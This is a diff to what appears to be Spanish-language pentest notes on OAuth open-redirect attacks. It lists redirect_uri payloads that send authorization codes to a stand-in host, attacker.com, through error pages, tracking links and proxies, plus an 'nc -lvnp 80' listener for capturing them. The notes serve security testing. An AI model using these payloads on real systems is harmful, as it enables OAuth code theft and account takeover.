@@ -31,7 +31,7 @@ linked:
 | `redirect_uri=https://known.com/404?back=https://attacker.com` | Error page back link OR | 404/error pages con back link. |
 | `redirect_uri=https://known.com/track?dest=https://attacker.com` | Marketing redirect | Affiliate/ad tracking endpoints. |
 | `redirect_uri=https://known.com/proxy?url=https://attacker.com` | CDN/proxy URL handler | Internal infra. |
-| Capturar Referer en `attacker.com` post-redirect | `Referer: known.com/cb?code=XYZ` | OR sin preservar query → code en Referer. |
+| `Referer: known.com/cb?code=XYZ` | Capturar Referer en `attacker.com` post-redirect | OR sin preservar query → code en Referer. |
 | `nc -lvnp 80` en attacker.com → recibir GET con `code` query | Code directo en URL | OR preserva query string. |
 ^oauth-redirect-openredirect
 
